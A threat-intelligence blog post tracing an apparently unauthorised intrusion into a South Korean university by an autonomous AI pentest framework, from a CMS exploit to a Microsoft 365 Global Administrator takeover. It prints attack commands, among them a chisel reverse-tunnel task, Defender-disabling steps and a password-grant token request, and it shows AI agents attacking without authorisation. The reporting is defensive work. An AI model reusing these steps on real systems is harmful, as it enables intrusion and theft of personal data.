---
title: "From a CMS exploit to Global Administrator: an AI pentest console inside a South Korean university, with 91 tables exported and 1,331 passwords cracked"
url: https://huntback.io/blog/ai-pentest-console-south-korean-university-global-admin
hostname: huntback.io
description: "The operator's own notes and logs, step by step: the way in, the tunnels, the data, the takeover of the tenant, and 20 students who do not exist."
sitename: Huntback
date: "2026-11-24"
categories: ['Threat intel']
tags: ['ARTEX', 'AI pentest console', 'Microsoft 365', 'Global Administrator', 'XpressEngine', 'password grant', 'hashcat', 'chisel', 'university', 'South Korea', 'open directory']
fingerprint: b793bb0bbfee44d7
language: en
image: https://huntback.io/blog/img/og/ai-pentest-console-south-korean-university-global-admin-x.png
pagetype: article
filedate: "2026-11-27"
---
# From a CMS exploit to Global Administrator: an AI pentest console inside a South Korean university, with 91 tables exported and 1,331 passwords cracked

A server that runs an ARTEX console, the web front end of an autonomous penetration-testing framework, also left four of its working folders open to the internet. We fetched them on 20 November 2026: 6,035 files, 1.16 GB. Almost all of it is one job. Task number 3 on that console was a South Korean university, and the folders hold what the agents and their operator did to it, most of it in three days in November: the exploit that got in, the tunnels, 91 exported database tables, the password-cracking logs, and a set of notes in which the operator records taking over the university's Microsoft 365 tenant as Global Administrator and then creating accounts in it. This post follows that record from the first request to the last, step by step, with the request shapes, tool settings, timings and log lines a defender can search for. The university is not named.

## In brief

- The workspace is organised the way ARTEX organises work: **52 task folders**, most named after an intent number, under a framework path that ends in `data/tasks/3`. The notes cite facts up to number 2,087 and findings up to 1,597.
- **One target.** Of 2,288 scripts, logs and notes, 648 name the same university. About fifty of its host names appear. No other organisation is worked on.
- Entry was a **public pre-authentication code-execution flaw in XpressEngine**, an open-source CMS, on the university's learning-content server. The fix has existed since October 2019. A web shell, SYSTEM on the host, a 70.9 MB memory dump of the Windows credential process and the browser password stores followed.
- On the campus network, reached through a second web shell and reverse tunnels, a **2017 SMB exploit** added a local administrator to an old Windows server, and the main website's source code gave up the database connection strings.
- **91 tables, 297 MB,** were exported from the academic administration database, on top of member tables from two web applications. One export has 60 columns, among them columns for both halves of the national resident registration number.
- Thirteen cracking runs on the attack server's CPU recovered **1,331 of 10,155 password hashes**. An eight-digit mask found 352 of them in two seconds.
- The single sign-on accepted a stored password hash in place of the password. That gave the operator a staff session, a password reset on the Microsoft 365 bridge, and a token carrying the **Global Administrator** role, valid from 18:47 UTC on 16 November. Within two hours the whole user directory had been exported.
- Over the next two days **20 licensed accounts** with student-style numbers were created, and a new account with an operations-sounding name was given Global Administrator.
- The script that did it opens with a comment saying it is for authorised assessments only. Nothing else in the workspace suggests one.

## What was open

The server is `38.60.157[.]51`. On port 8787 it shows the sign-in page of an ARTEX console. On ports 80, 8000, 8800 and 18080 it ran plain file servers with directory listings, the kind started with one command to move a file from one machine to another and then forgotten. Port 80 holds 69 files staged for download onto a compromised Windows host. Port 8800 holds two public tool repositories (an SMB exploit collection and an HTTP tunnel) and a set of small relay scripts. Port 8000 is the working directory itself, 5,711 files.

Everything points at one place. We read the 2,288 scripts, logs and notes on the server (leaving the data exports closed, as described below) and counted the Korean organisations they name. One university's domain appears in 648 of them, with about fifty of its host names. Other Korean domains appear only inside copied vendor source code and saved web pages. This is a single intrusion, documented by the tool that carried it out.

## How ARTEX looks from its own working folder

ARTEX is a multi-agent system: a planner hands "intents" to workers that have a shell, and records what they learn as facts and findings. The folder shows that structure from the outside. Fifty-two task folders, most named `i` plus an intent number, from `i174` to `i3811`. A file left by one worker quotes the path it ran in, `/root/ARTEX-God/data/tasks/3/i1092/`. The reports are written in Simplified Chinese, their times are labelled UTC+8, and the server's own logs run eight hours ahead of UTC. One log happens to prove the offset: a scan the server stamps 07:50 on 17 November contains a target's own clock reading of 23:51 UTC on 16 November.

An intent folder has a recognisable anatomy:

- **Scripts written for that intent alone,** usually 10 to 100 lines of Python, PowerShell, batch or VBScript, with the intent number in the first comment (`# SYSTEM command channel ... (intent 673)`).
- **Raw output beside each script,** saved response bodies, header dumps, and a log.
- **A closing note** named `EVIDENCE.md`, `REPORT.md` or `SUMMARY.md`. Each states a conclusion, cites the numbered records it rests on (`finding#1503`, `fact#1886`, tunnel `session#81`, graph node 843), lists the evidence files, and ends with a section headed "re-test" that gives the commands and the expected result, or one headed "next steps" that says what the work is waiting for.

The numbering leaks onto the victim. A local administrator account the workers created is named after intent 1027. A scheduled task is called `nc673`. A folder on a campus server is `C:\i3811`, and marker files in the root of another are `C:\i1027_add.txt` and four siblings. For anyone doing incident response on a host that an ARTEX worker has touched, an `i` followed by three or four digits is the string to search for.

The notes are thorough about dead ends. One closing note spends a page proving that an interface which answered every request with success in fact changed nothing. The same note records twelve encodings of a source-disclosure trick, all blocked. The planner evidently rewards certainty, and the workers supply it either way.

## Timeline

All times are UTC, converted from the server's UTC+8 stamps or taken from Microsoft's own timestamps in saved responses.

| When (UTC) | What the files record | 
|---|---|
| 15 Nov, 23:07 | Earliest dated line in the workspace: an nmap run against campus addresses starts | 
| 16 Nov, 01:40 | First test of a guessed student login against Microsoft's sign-in service. The answer is that the account does not exist | 
| 16 Nov, 02:37 | hashcat starts on three local Windows account hashes. The content server has therefore been taken, raised to SYSTEM and had its registry hives exported by this point | 
| 16 Nov, 03:38 | A second web shell, on a campus library web server, is in use. The line comes from that server's own web log, which the workers later searched and saved | 
| 16 Nov, 13:36 | First reverse tunnel server starts on the attack server, with forwards to a campus SQL Server and to the SMB, remote desktop and remote management ports of two campus hosts | 
| 16 Nov, 14:31 | Marker files written by a modified MS17-010 exploit appear in the root of a campus Windows server, next to a new local administrator | 
| 16 Nov, 15:23 | The main tunnel listener starts on port 45901 | 
| 16 Nov, 15:48 to 16:24 | Four cracking runs on the CMS member hashes | 
| 16 Nov, 17:04 | First Microsoft 365 tokens, for an ordinary account: one for Outlook, one for Graph | 
| 16 Nov, 18:26 | Cracking run on 3,833 student single sign-on hashes | 
| 16 Nov, 18:47 | A token carrying the Global Administrator role becomes valid | 
| 16 Nov, 18:56 to 19:01 | Read-only Graph requests saved as proof | 
| 16 Nov, 20:32 to 20:45 | Directory export: every user object in pages of 999, then the members of each administrative role | 
| 16 Nov, 21:30 to 22:10 | Re-test of the Microsoft 365 bridge, to separate functions that work from functions that only say they do | 
| 16 Nov, 22:56 to 23:19 | Three cracking runs on the web application hashes. The last takes two seconds | 
| 17 Nov, 19:28 | Last new tunnel session, number 339 | 
| 17 Nov, 23:41 | Fresh Global Administrator tokens for the same staff account, a day after the takeover | 
| 17 Nov, 23:47 and 23:48 | Two student-style accounts created and licensed | 
| 18 Nov, 08:47 | Last line of the main tunnel log: a session closes after 13 hours 20 minutes | 
| 18 Nov, 11:42 | Three more accounts created in 41 seconds | 
| 18 Nov, 17:17 | Fifteen accounts created and licensed | 
| 18 Nov, 18:22 | Dry run planning a further batch | 
| 18 Nov, 18:44 | A token for the newly created administrator account becomes valid, with the Global Administrator role in it | 
| 18 Nov, 18:49 | Second dry run, slowed by Microsoft's rate limiter | 
| 19 Nov, 21:42 | Last line of a forwarder that had been retrying, and failing, roughly once an hour for two and a half days | 
| 20 Nov, 09:55 to 10:33 | We copy the open folders | 

## The way in: a 2019 flaw in XpressEngine

The university's learning-content site ran XpressEngine (XE), an open-source CMS that is common in South Korea. The script that opened it is 26 lines long and makes three GET requests to the site's front page. A comment on the first calls it the "article PoC": the technique was taken from a public write-up, not discovered. That write-up, published in April 2024, describes a pre-authentication code-execution flaw that the XE project fixed in version 1.11.6 in October 2019 under advisory XEVE-19-008<sup>[4](https://huntback.io/blog/ai-pentest-console-south-korean-university-global-admin#r4)</sup>. The workspace also holds a copy of the XE source tree, 2,355 files in a folder named for version 1.11.5, the release before the fix, which the workers downloaded to read the vulnerable code for themselves.

The three requests, by shape:

| Step | Request | Effect | 
|---|---|---|
| 1 | `GET /?mid=<a board>&module_srl=<traversal string>` | The feed module builds a folder path from `module_srl` without checking it is a number, and creates the folder. The traversal string ends in a folder name that is itself a PHP expression in `${...}` form | 
| 2 | `GET /?act=dispWidgetInfo&selected_widget=<path through that folder>` | The widget module writes a compiled cache file for the "widget" it was asked about. The path, with the expression in it, ends up inside that generated PHP file | 
| 3 | `GET /?act=dispWidgetInfo&selected_widget=<the same widget>&0=<code>&1=<command>` | The cache file is included. PHP evaluates the expression, which runs whatever is in the request parameter named `0`. The script places a call to the system shell there and the command in parameter `1` | 

Three things make this visible in a web server log. The parameter `module_srl` is normally a small integer, and here it contains `../` and `${`. The parameter `selected_widget` is normally a bare widget name, and here it contains `../`. And no legitimate XE request has query parameters named `0` and `1`. The script reads its command output from whatever the server sends before the page's `<!DOCTYPE html>`, so a response to step 3 has text ahead of the doctype.

Every request in these scripts carries the same User-Agent, a Chrome 124 string whose version reads `Chrome/124.0` where a real browser sends four numbers. A second script, 18 lines, wraps step 3 into a reusable function. The workers then replaced it with something more comfortable: a one-line PHP web shell in the web root, named `_cfg_` plus four hexadecimal characters, which runs whatever arrives in parameter `x`. A second file beside it, `dbx.php`, does the same for SQL statements in parameter `q`.

## From web shell to SYSTEM

The web server's service account was a member of the local Administrators group, and the same account ran fifteen Windows services belonging to the content platform. The workspace shows three separate routes from that account to SYSTEM being prepared, and records one of them as the route that worked.

**Token impersonation, loaded from memory.** A family of short PowerShell scripts on port 80 downloads `GodPotato-NET4.exe` from the attack server as bytes, loads it with `[Reflection.Assembly]::Load` and calls its entry point with a `-cmd` argument, so the executable never touches the disk. Variants use it to run a batch file, to copy the exported registry hives into the web root, and to register a scheduled task. `PrintSpoofer64.exe` is staged as an alternative.

**A database plugin.** A SQL file writes a user-defined-function library (`lib_mysqludf_sys_64.dll`) into the upload folder of a MySQL 5.7 instance and registers a function named `sys_exec`, which runs operating-system commands as the database service.

**A logging configuration that reloads itself.** This is the one the operator's report cites as the source of SYSTEM. A companion .NET application on the same host ran under a more privileged identity and watched its own `log4net.config` for changes. The web shell could write to that file. The worker script uploads a command to a text file, copies two prepared configuration files over `log4net.config` two seconds apart, and then polls a second text file for the output. The script's header calls this a "SYSTEM command channel via log4net hot-reload".

The same script shows how files were moved onto the host with nothing but the web shell: the file is base64-encoded, appended to a `.b64` file 400 characters at a time with `echo ... >>`, and decoded in place with `certutil -decode`. On a campus host later, the same routine uses 1,200-character chunks.

With SYSTEM, the workers switched the defences off. One script adds the web root as a Microsoft Defender exclusion and disables real-time, script, download and behaviour monitoring through `Set-MpPreference`. A batch file stops the Defender service, sets it to disabled, and writes the two policy registry values that turn it off.

## Everything the host knew

Credential access is documented file by file.

- **The credential process.** A short C# program opens a process by ID with full access and calls `MiniDumpWriteDump` with the full-memory flag. The dump was then fetched over the web. The first attempt returned a 404; the second returned 70,936,098 bytes in 7.9 seconds, both recorded in one-line logs. A 34 KB log beside it is the output of a parser run over the dump.
- **The registry hives.** `reg save` of SAM, SYSTEM and SECURITY to the Windows temp folder, then a copy into the web root with read access granted to everyone. An impacket 0.13.1 run over the three files lists six local accounts and the stored service secrets. The same password appears under each of the fifteen platform services, which is how the operator knew one password ran all of them.
- **Stored Windows credentials.** Another small C# program enumerates the Windows Credential Manager and looks up saved credentials for specific internal addresses, among them the storage appliance and two remote desktop targets.
- **Browser stores.** The saved-login databases of Chrome and Edge, the browsing history, and a program that unwraps each browser's encryption key with `CryptUnprotectData`. That call only works in the context of the user who owns the profile, so the workers built a second channel: through SYSTEM they created a scheduled task that runs as the interactive administrator (`schtasks /create /tn nc673 ... /ru <user> /it`), ran their program inside that user's session, and read the output back through the web shell.
- **The cloud platform.** A script requests a session token from the instance metadata service and then asks for IAM credentials, the login key name and the user data. The summary notes that the IAM answer was empty.
- **A cloud storage key.** An access key used by a captioning service on the host was tried against some forty storage and identity API calls. It could read the configuration of one bucket and was refused everything to do with identity.

Cracking the three local account hashes was the first thing tried, at 02:37 UTC, and it failed: 0 of 3. Nothing else on this list needed cracking.

## Tunnels, and the victim as a proxy

The tool is chisel, started as a client on the victim and pointed at a server on the attack machine with a reverse SOCKS remote. On the content server it was made permanent as a scheduled task that starts at boot as SYSTEM:

`schtasks /create /tn X9137Chisel /tr "<web root>\chisel.exe client --keepalive 25s 38.60.157[.]51:8904 R:11080:socks" /sc onstart /ru SYSTEM /rl HIGHEST /f`
On other hosts the binary was copied to the Windows temp folder under a shorter name and started hidden with `Start-Process`, with its output redirected to a log the workers could read back.

The attack server ran at least seven listeners over three days. The logs give this picture:

| Listener | Started (UTC) | What the log shows | 
|---|---|---|
| 8080 | 16 Nov, 13:36 | Six sessions. SOCKS, plus fixed forwards to a campus SQL Server (1433, 445, 5985, 21, 80, 2383) and a second campus host (445, 3389, 5986) | 
| 45901 | 16 Nov, 15:23 | The main listener. Session numbers reach 339. Clients connect from six addresses in four networks, one of them the content server. Client versions 1.10.1 and 1.8.1 against a 1.12.0 server | 
| 8085 | 16 Nov, 18:13 | One SOCKS session | 
| 45905 | 16 Nov, 20:44 | Two SOCKS sessions, the second on 17 Nov at 19:08 | 
| 45990 | 16 Nov, 23:09 | One SOCKS session from the library web server, which logs dozens of stream errors 37 minutes later | 
| 45991 | 16 Nov, 23:47 | Three SOCKS sessions | 
| 8904 | not logged | The target of the scheduled task above | 

Each client exposes its SOCKS proxy on a different local port of the attack server (1080, 1081, 1085, 1093, 15080, 19091, 19092), and each worker gets a proxychains configuration that points at the port for the network it needs. That is how several workers could operate in different parts of the university at once.

Two of the forwards deserve a second look. Three sessions on the main listener ask for `R:0.0.0.0:1433` to a campus database server, and the last session asks for `R:0.0.0.0:2222` to the client's own SSH port. A reverse remote bound to `0.0.0.0` listens on every interface of the server. While those sessions were up, the university's internal SQL Server and one host's SSH service were reachable by anyone who connected to the attack server's public address on those ports.

The tunnel did another job. The university's main site answered the attack server's direct requests with a block page of about 4,270 bytes where the real page is about 2,060. The operator tried a rented SOCKS exit in South Korea first, and wrote a check script that compares those two sizes to tell whether the exit is still being served the real page. The better answer was a 1,771-byte relay placed on the compromised content server: it takes a POST with a JSON body of `{url, method, headers, body}`, makes the request from the university's own address, and returns `{status, headers, body}` with the body in base64. The notes call it the Korean exit relay. From that point the university's defences were being probed from one of its own machines. Two smaller PHP relays on port 80 do the same with form fields.

## Mapping the inside

The content server sits in a cloud network, not on campus. The workers swept it with their own PowerShell and C# port scanners (compiled on the host), every /24 from 0 to 40 of the private range, and wrote a 2 KB summary. It found the learning-management servers and nothing else of interest: no second Windows host, no database server, and no directory service (`nltest` returns "no such domain", and no host answers on the Kerberos or LDAP ports). In a link-local range it found a pair of storage appliances holding the platform's media and nightly backups.

A 17 KB report covers those appliances. The service account password already taken from the content server opened the backup share. The same password, tried for the appliance's built-in administrator, came back with "password must change", an answer that only a correct password produces. The report shows the control (a wrong password and a wrong user name produce a different error), then documents two attempts to change the expired password remotely, both blocked by gaps in the appliance's implementation of the account-management interface. It closes with a remediation section and a list of residual state, written as if for a client.

The summary's last line sets the direction: the cloud network ends here, and the way to the directory is back toward the campus. On campus the workers used heavier tools. fscan 2.2.2 was run from a compromised campus web server across the campus ranges, with ping discovery and its web, NetBIOS and SMB plugins. Two purpose-written sweeps, one of them for directory services, covered 1,337 targets in 56 seconds and 10,230 targets in 133 seconds, and both ended in `hits=[]`. nmap scripts read the NTLM banners of remote desktop and SQL Server ports, which give host names and Windows build numbers without logging in. The result was a picture of standalone Windows servers of three generations, Server 2008 R2, 2012 R2 and 2022, and two SQL Server instances reporting versions 2005 SP4 and 2012 SP4.

## A 2017 exploit, and what the website's source gave away

Port 8800 holds a public collection of MS17-010 exploits<sup>[5](https://huntback.io/blog/ai-pentest-console-south-korean-university-global-admin#r5)</sup>. One file from it, 43 KB, was copied into an intent folder and edited. In the original, the function that runs once the exploit has SYSTEM creates a harmless text file. In the workspace copy it prints "SYSTEM ctx reached, creating admin" and runs seven commands through a temporary Windows service: add a local user named after the intent number, add it to Administrators and to Remote Desktop Users, and write the group list, two drive listings and the web root listing into marker files in `C:\`.

A directory listing captured later from a campus Windows server shows those marker files, created at 14:31 UTC on 16 November. The evidence note for the database credentials cites that account, and a server's administrative share, as the way the file was read. A separate check of two other campus hosts with nmap's script for the same flaw ended in a script error and was recorded as inconclusive.

The server mattered because of what was on its disk. The main website's single sign-on is written in classic ASP, and its include file holds five database connection strings in clear text: four accounts on the academic administration database (Oracle, reached through the Microsoft OLE DB provider) and one on a SQL Server. The operator's evidence note quotes the file path and the provider strings, then the proof that they work: a VBScript on the web server opens the Oracle connection, runs `select user from dual`, and counts the rows of three tables: the staff accounts, the personnel table and the student register.

The SQL Server account was worked separately. A run of PowerShell scripts tries the standard routes from a database user to the server's administrator role: a stored procedure created `WITH EXECUTE AS OWNER` in a database marked trustworthy, `EXECUTE AS USER='dbo'` followed by an attempt to enable `xp_cmdshell`, and reads of the registry through extended procedures. One saved output shows where that stood: the login held only `CONNECT SQL` and `VIEW ANY DATABASE` at server level and the registry procedures were refused.

## The data

We did not open the exported data beyond file names, sizes and, where one existed, the header row. That is enough to say what was taken.

| Source | What the workspace holds | 
|---|---|
| Academic administration database | 91 tables exported to text files, 297 MB, from three schemas whose table names concern student records (13 tables), administration (12) and system management (66). The student register table alone is 15.5 MB. One table is named for resident registration numbers. | 
| Library and e-book web applications | User tables, and one member table exported as SQL (4.0 MB) and parsed to CSV. Its header has 60 columns, including name, birth date, both halves of the resident registration number, phone numbers, home and work addresses. | 
| Content-management system | Full database dumps and the member table with password hashes. | 
| Learning-content storage | 469 MB of course media and a listing of uploaded items, including items flagged as private. | 
| Internal documents | A folder of numbered official documents in Korean office formats and PDF, each with a text extract beside it. | 
| Website source | A selective copy of a 2024 backup archive of the web root: configuration files, ASP includes, and any file whose name mentions sign-on, student numbers, identity numbers, passwords or database configuration, capped at 150 MB. | 
| Microsoft 365 directory | A 4.5 MB export of the tenant's user objects, the members of the administrative roles, the first 100 devices, 18 application registrations and 100 service principals. | 
| Compromised Windows host | The memory dump, registry hives and browser credential stores described above. | 

The 91-table export shows how the workers adapt when the direct route fails. They first tried to forward the Oracle listener's port through the SOCKS tunnel to the attack server; the forwarder's log ends in a proxy error. So the export ran where the database driver already was, on the campus web server. A VBScript connects with the website's own credentials, lists every table owned by the three schemas, and writes each to a tab-separated file under `C:\i3811\data`, escaping tabs and newlines, formatting dates, and hex-encoding binary columns. A batch file re-runs the tables that failed, one `cscript` call per table. The files were then served by the web server that hosts the second web shell and pulled down with curl through the tunnel, three at a time, with resume enabled and a 15-minute limit per file.

One detail in the evidence note is worth a defender's attention on its own. Beside the live staff table is a backup copy of it from before passwords were hashed: 56 rows, with a 20-character password column in clear text. Backup tables made during a migration outlive the migration.

The whole of it sat in a folder anyone could list. The access log of one of the four open file servers was itself among the files: in the five days before we arrived it recorded requests from 4,653 addresses, 47 of which fetched fifty files or more.

## 1,331 passwords

The hashes went straight to hashcat 6.2.5 on the attack server. There is no GPU: every log names the same device, a virtual Intel Xeon (Skylake) CPU. The dictionary is rockyou with the best64 rule set, plus short lists built for the target and plain digit masks. The logs carry hashcat's own counts.

| Start (UTC, 16 Nov) | Hashes | Mode | Attack | Speed | Recovered | 
|---|---|---|---|---|---|
| 02:37 | Windows local accounts | 1000, NTLM | rockyou + best64 | 17.6 MH/s | 0 of 3 | 
| 13:59 | Older application table | 0, MD5 | rockyou + best64 | 10.4 MH/s | 44 of 361 | 
| 15:48 | CMS members, a 108-hash subset | 10900, PBKDF2-HMAC-SHA256 | target word list | 1,210 H/s | 94 of 108 | 
| 15:54 | CMS members, all | 10900 | target word list | 981 H/s | 81 of 1,068 | 
| 16:00 | CMS key accounts | 10900 | key-account list + best64 | 1,143 H/s | 2 of 8 | 
| 16:06 | CMS key accounts | 10900 | second list + best64, 18 minutes | 1,215 H/s | 0 of 6 | 
| 18:26 | Student single sign-on | 1400, SHA-256 | rockyou + best64, 3 minutes | 5.3 MH/s | 324 of 3,833 | 
| not stamped | Student single sign-on | 1400 | digit masks, 6 to 9 digits |  | 271, then 348, 356, 358 of 3,833 | 
| 22:14 | Four staff accounts | 1400 | rockyou | 0.8 MH/s | 0 of 4 | 
| 22:56 | Older application table | 0, MD5 | rockyou + best64 | 17.5 MH/s | 44 of 364 | 
| 23:01 | Web application users | 300, MySQL 4.1/5 | rockyou + best64, 81 seconds | 12.3 MH/s | 496 of 4,890 | 
| 23:18 | Web application users | 300 | eight-digit mask, 2 seconds | 62.0 MH/s | 848 of 4,890 | 

Taking the final count for each full list gives the total: 848 of 4,890, 358 of 3,833, 81 of 1,068, 44 of 364 and 0 of 3, which is 1,331 of 10,155.

Two rows carry the lesson. The mask run on the student hashes tried every number of six digits and recovered 271 passwords; by nine digits it had 358. The student single sign-on stores a password as an unsalted SHA-256 digest in base64, 44 characters, and the evidence note confirms the format by hashing two known values. A million guesses is nothing against that. On the web application table, all one hundred million eight-digit numbers were tried in two seconds and 352 more accounts fell. In both systems a large share of users had a number, most likely a date, as their password, and nothing in the storage format made that expensive to find.

The properly stretched CMS hashes behaved differently. XE stores a 22-character salt and a PBKDF2 digest with 32,768 iterations; the workers ran at about a thousand guesses a second and wrote two crackers of their own in Python that build candidates per account, from the user ID, the e-mail name and any run of digits in either, with a list of 27 suffixes. One run reports its arithmetic: 9 accounts, 2,802 candidates each, 25,218 evaluations in 288 seconds. A targeted run against a single account tried 7,558 candidates in 329 seconds and missed. Fewer than 8% of that table was recovered.

## Guessing at the front door

Where there was no hash, the agents wrote guessers fitted to the site, and their logs record the rate and the result.

- **A staff password spray.** The staff sign-in takes a name as the identifier. The first version sends one request every 0.33 seconds with a fresh cookie jar each time, working through a word list built for the target: the school's initials with years and common suffixes, Korean words typed on an English keyboard layout, and common Korean surnames followed by 1234. A second, parallel version orders the work by password first and account second, the pattern that avoids lockouts. Its log ends `DONE 1572/1572 in 307s hit=None`.
- **A student-number lookup.** A self-service page returns a student number to anyone who supplies a name and a birth date. The guesser asks about every day of each candidate year, 366 requests a year. Two runs, 1,096 requests in 72 seconds and 2,922 in 180 seconds (about 16 a second), both ended in a miss.
- **A password-recovery oracle.** The second step of password recovery answers differently for a right and a wrong birth date. Three runs of 1,341 to 1,557 requests each, at about 36 a second, each end with exactly one response that differs from all the others: the birth date, found in under 45 seconds.
- **An identity-number quiz.** The next recovery step asks for two digits of the resident registration number. The script's opening comment states the search space: "2 of 7 digits => 100 combos". Its log counts past 430 attempts, ten at a time.
- **SQL injection tests.** sqlmap 1.10.11 was pointed at the sign-in form and at a parameter of a PHP application. Its log notes a web application firewall and switches to a random browser User-Agent. Hand-written tests against the lookup page compare the row counts returned for always-true and always-false conditions.

Most of these requests left through the rented Korean SOCKS exit or the relay on the content server, so the sign-in server saw them arrive from Korean addresses, some of them its own.

## A phishing page that runs on the real address

A 6 KB report describes a cross-site scripting flaw in the sign-in handler and how it was, in the report's word, "weaponised". The handler copies its return-address parameter into a line of JavaScript that sets `location.href`. The server protects the string by putting a backslash in front of every double quote, and does nothing about backslashes. A value that supplies its own backslash before the quote therefore closes the string and continues as code.

The report then solves the practical problem, which is that the page navigates away as soon as that line runs. Its answer is to make the assigned address the handler's own path plus a fragment, so the browser treats it as a move within the same document and the injected code keeps running. Three parts are built on that:

1. a page on any other site that fills in a hidden form and posts it to the real sign-in handler. There is no anti-forgery token and no CAPTCHA, and the session cookie is sent with the cross-site POST;
2. the injected script, now running on the university's genuine address, which reads cookies and can fetch signed-in pages with the visitor's credentials;
3. a full-screen overlay in Korean telling the user that their password has expired, which sends what is typed to a collector on port 9443 of the attack server and then submits the real sign-in so the user lands where they expected.

Two findings make it worse. The single sign-on cookie is set for the whole domain with neither the HttpOnly nor the Secure attribute, so script on any page of any of the university's sites can read it. And the firewall in front of the site blocks the literal word `function` but passes arrow functions, `new Function`, an injected SVG element with an event handler, and a 16 KB parameter value.

The report lists five end-to-end tests with a demonstration account, each with its evidence file, and ends with a section headed "next steps", waiting for a valid session.

## From a hash to Global Administrator

The first Microsoft 365 tokens in the workspace, valid from 17:04 UTC on 16 November, belong to an ordinary account. They were used to read its profile, its group memberships, the licence pools and the five newest messages in its inbox. An hour and three quarters later the operator had something much larger.

The step that mattered most needed no cracking at all. The operator's evidence note for it is 3 KB and reads like a lab report with five numbered sections.

**1. The single sign-on accepts the stored value.** The staff table in the academic database stores each password as the 44-character base64 form of an unsalted SHA-256 digest. The sign-in handler is an ordinary form POST with an identifier, a password field and a field that says whether the user is a student or staff. Sent with a staff member's name and the 44-character stored value in the password field, it answers 200 and sets the single sign-on cookie, 1,392 characters, valid across the university's domain. The note then requests a diagnostic page that echoes the session and records what it shows: a member of the IT office. Whoever holds the table can sign in as anyone in it without knowing a single password.

**2. The bridge to Microsoft 365.** The university runs a small Node application that lets a signed-in member activate and manage their Microsoft 365 account. The hand-off is three requests: a page on the groupware site confirms the session, a redirect sends the browser to a one-time address on the bridge, and that address returns a 267-byte page that auto-submits a hidden form. The bridge then shows the member's cloud account name and treats the session as that member.

**3. A reset form that does not ask for the old password.** The bridge's reset form has four fields: an anti-forgery token, an account ID and the new password twice. A PUT with a new password returns `{"state":true}`. The note includes a control experiment: the same request with another account's ID in the ID field also returns success, and changes the session owner's password, not the other account's. The server takes the identity from the session and ignores the field. That rules out resetting arbitrary accounts through this form, and the note says so.

**4. The token.** With the new password the operator requested a token directly from Microsoft's sign-in service with the resource owner password credentials grant<sup>[1](https://huntback.io/blog/ai-pentest-console-south-korean-university-global-admin#r1)</sup>, which involves no browser and no second factor:

```
POST https://login.microsoftonline.com/common/oauth2/token
grant_type=password
client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c      (Microsoft Office)
resource=https://graph.microsoft.com
username=<staff account>   password=<the password just set>
```
The saved response is valid from 18:47:53 UTC on 16 November. The note lists what the token carries: the role template ID `62e90394-69f5-4237-9190-012177145e10`, which is Global Administrator<sup>[2](https://huntback.io/blog/ai-pentest-console-south-korean-university-global-admin#r2)</sup>, and delegated permissions that include reading the directory, acting on it as the user, and reading and writing mail and files. Five read-only Graph requests follow, all answered: `/directoryRoles` (16 roles), `/users?$top=3`, the staff account's own record, `/subscribedSkus` (8 licence pools) and `/organization`.

**5. State left behind.** A single line: the staff member's Microsoft 365 password is now the one set during the test, and the original cannot be restored.

Less than two hours later, between 20:32 and 20:45 UTC, a background script walked the directory. Its log shows `/users` fetched in pages of 999, Microsoft's rate limiter answering 429 on every third page or so with a retry delay of about 21 seconds, and the script waiting and continuing until it had every user object. A second script pulled the members of each administrative role.

### Telling real functions from polite ones

A companion note, written between 21:30 and 22:10 UTC, goes back over the bridge. The application also exposes a small programming interface for creating accounts and setting passwords, protected by a key, and that key turned out to be in the hidden form shown to every signed-in student. The workers established the minimum set of fields each call needs by leaving them out one at a time, then tested whether the calls do anything.

They did not take `{"state":true}` for an answer. For account creation they called the interface for four invented IDs and then asked Microsoft's public sign-in endpoint whether each account exists. It said no. For password setting they changed a test account's password through the interface, tried the new password against the token endpoint every ten seconds for a minute, got error AADSTS50126 (wrong password) each time, and confirmed that the old password still worked. Conclusion, recorded as fact 1,997: the interface is a stub that reports success and changes nothing. The administrative pages of the bridge, tested with header tricks, injection strings and verb changes, stayed closed.

### Forged sign-on tokens

Two more intent folders show the single sign-on being taken apart from another side. The content server is a legitimate consumer of the university's sign-on, so it has the component that encrypts and decrypts the sign-on cookie, and the main site's decoding endpoint, which refuses unknown addresses, trusts it. The workers ran a short VBScript on the content server that calls that component to build a cookie for any record they chose, then checked each forged cookie against every site that honours the sign-on, anonymous request against forged request. For the main site's profile page the table reads 211 bytes anonymous and 2,859 bytes with a forged administrative identity. The decoded samples also show what the genuine cookie contains: an identifier, a category and a password field.

## Twenty students who do not exist

On 17 November at 23:41 UTC the staff account's password still worked: fresh tokens were issued, again with the Global Administrator role. Six minutes later the work turned from access to use. Two accounts with student-style numbers were created at 23:47:42 and 23:48:17 UTC and given a licence.

The next day the operator had a proper tool for it. A 687-line script creates Microsoft 365 users in bulk and assigns them licences. Its opening comment says, in Chinese, that it is for authorised red-team assessments and asset inventory only, and then lists seven design points under a heading that translates as "every pit you could step in is covered":

- **Token life cycle.** Read the cached token, check its expiry, renew silently with the refresh token, fall back to the password grant if that fails, and write the new token to disk atomically with owner-only permissions.
- **Errors.** Re-authenticate once on 401, report 403 as missing permission, obey `Retry-After` on 429 for up to eight tries, back off exponentially on server errors.
- **Names.** Probe a number range in order, check existence in chunks with `$filter`, skip numbers already taken, move to the next number on a conflict. Display names are drawn from a list of 40 Korean personal names written into the script.
- **Pace.** One write every five seconds by default, "to avoid tenant-level throttling".
- **Licences.** Read the licence pools, compare with what each account already has, assign only what is missing. The defaults are the two student licences: the Office 365 student plan and the student desktop-apps subscription.
- **Resume.** Every created account is appended to a journal file, and a re-run skips what is already there.
- **Audit trail.** A run log and a results file, "so every action is traceable".

Each user is created with `POST /v1.0/users`, with a generated 14-character password in the password profile and the usage location set to KR (a licence cannot be assigned without one). Licences go on with `assignLicense`. The usage text gives, as its example proxy, a SOCKS address on one of the reverse-tunnel ports: the script was written to be able to reach Microsoft from inside the university's own network.

The files beside it record what it did. Three accounts created between 11:42:14 and 11:42:55 UTC on 18 November. Fifteen more at 17:17 UTC: fourteen created at the first attempt, one refused for a moment by Microsoft's rate limiter and created on retry, then all fifteen licensed. Every one of the fifteen has a number where a student ID would go and a Korean personal name as its display name. A further file holds the response to a role assignment: one more account, with a display name that translates as "M365 operations management", was made Global Administrator. A token for that account, with the role in it, is valid from 18:44 UTC.

At 18:22 and 18:49 UTC the script was run twice more in dry-run mode, planning further batches in two new number ranges. The second run shows the tenant pushing back: three 429 answers in a row, each waited out for about 22 seconds. One log line reports the size of the pool it was drawing on: about 993,523 unassigned licences of the first student plan, and 2,954 of the second. The workspace does not say what the accounts were for. A university tenant can mint as many as an operator wants, each with a mailbox on an academic domain and a student licence, and a second administrator means the first one's password being reset does not end the access.

## "Authorised" is a word in a comment

